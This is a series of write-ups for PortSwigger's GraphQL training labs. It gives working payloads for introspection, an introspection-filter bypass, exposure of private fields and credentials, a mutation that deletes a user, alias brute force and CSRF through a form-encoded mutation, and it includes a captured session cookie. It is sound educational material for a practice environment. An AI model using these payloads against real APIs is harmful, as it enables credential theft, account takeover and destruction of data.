## Accessing private GraphQL posts
[Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

Write-up: 
1. We need to get the password of the hidden blog post. Intercepting the request to / shows us a POST request to /graphql/v1:
   
    ```json
    {"query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}","operationName":"getBlogSummaries"}
    ```

    We can see by the response to this request that the post with id=3 isn't being displayed.

2. Using introspection, we can find more about the schema:

    ```json
    {"query": "query { __schema { types { name fields { name } } } }"}
    ```

    We discover a getBlogPost query, as well as a postPassword field.

3. To find out more about the getBlogPost query, we use:

    ```json
    {
        "query": "query { __type(name: \"query\") { fields { name args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name } } } } }"
    }
    ```

4. Using the new information we got, we can craft a request to get us the missing post:

    ```json
    {
        "query": "query getBlogPostById($id: Int!) { getBlogPost(id: $id) { image title summary id postPassword } }",
        "operationName": "getBlogPostById",
        "variables": { "id": 3 }
    }
    ```

    This reveals the password: **l58w5rj7y2lqog9oqpgautmrocsirx7r**

## Accidental exposure of private GraphQL fields
[Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

Write-up:

1. Using introspection, we can find more about the schema:

    ```json
    {"query": "query { __schema { types { name fields { name } } } }"}
    ```

    We discover a getUser query and a User object.

2. To get more information about User we use:

    ```json
    {"query": "{ __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"}
    ```

    This shows us User object has id, username and password.

3. To get admin details:

    ```json
    {"query": "query { getUser(id: 1) { id username password } }"}
    ```

    This shows credentials **administrator:6fegsn30pc958nfulcl8**

4. Logging in gives us access to admin panel which allows us to delete user **carlos** and solve the lab.

## Finding a hidden GraphQL endpoint
[Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

Write-up:

1. Attempting to access some common locations for GraphQL endpoints makes us find `/api`,
   which returns a JSON with "Query not present".

2. Attempting to access `/api?query={__schema{queryType{name}}}` returns "GraphQL introspection is not allowed, but the query contained __schema or __type".

3. To bypass, we use `GET /api?query={__schema%0A{types{name,kind,fields{name,type{name,kind}}}}}` and we find a deleteOrganizationUser mutation.

    ```http
    GET /api?query=query%7B__type%0A(name:%22mutation%22)%7Bfields%7Bname%20args%7Bname%20type%7Bname%20kind%20ofType%7Bname%20kind%7D%7D%7D%20type%7Bname%20kind%7D%7D%7D%7D
    ```

    This shows us there are objects called DeleteOrganizationUserInput and DeleteOrganizationUserResponse.

    ```http
    GET /api?query=query%7B__type%0A(name:%22DeleteOrganizationUserInput%22)%7Bname%20kind%20inputFields%7Bname%20type%7Bname%20kind%20ofType%7Bname%20kind%7D%7D%7D%7D%7D
    ```

    We find out that this object takes in the user id as a parameter.

4. We need to find carlos' user id. Iterating from 1 to 3 shows us that carlos has id=3.

    ```http
    GET /api?query=query%7BgetUser(id:3)%7Bid%20username%7D%7D
    ```

5. This payload deletes user carlos and completes the lab:

    ```http
    GET /api?query=mutation%0A%7BdeleteOrganizationUser(input:%7B%20id:3%20%7D)%20%7Buser%20%7Bid%20username%7D%7D%7D
    ```

## Bypassing GraphQL brute force protections
[Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

Write-up:

1. We are instructed to brute-force the login. Using `alias-brute-force-login.py` 
   (which uses aliases to bypass rate limiting), we are able to find the credentials
   and solve the lab: **carlos:1234567890**

## Performing CSRF exploits over GraphQL
[Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

Write-up:

1. After logging in, we can use Caido to see the update email request:

    ```http
    POST /graphql/v1 HTTP/1.1
    Host: 0a8000a10490937680fd179b004b00e3.web-security-academy.net
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0
    Accept: application/json
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br, zstd
    Referer: https://0a8000a10490937680fd179b004b00e3.web-security-academy.net/my-account?id=wiener
    Content-Type: application/json
    Content-Length: 228
    Origin: https://0a8000a10490937680fd179b004b00e3.web-security-academy.net
    Connection: keep-alive
    Cookie: session=c1CaJ0YeDIINGvc5MzcYcUs2bIUz7mi2; session=c1CaJ0YeDIINGvc5MzcYcUs2bIUz7mi2
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Priority: u=0

    {
        "query": "\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n",
        "operationName": "changeEmail",
        "variables": {
            "input": {
                "email": "jpcsousa@outlook.pt"
            }
        }
    }
    ```

2. Attempting to repeat this request with different emails shows us we can reuse the request.

4. We can convert the request to a POST with `Content-Type: application/x-www-form-urlencoded` by changing the headers and URL-encoding the body:

    ```http
    POST /graphql/v1 HTTP/1.1
    Host: 0a8000a10490937680fd179b004b00e3.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 176
    
    query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
    ```

5. We create a CSRF PoC HTML file: `csrf-poc.html`

6. Hosting this HTML on the exploit server and delivering it to the victim solves the lab.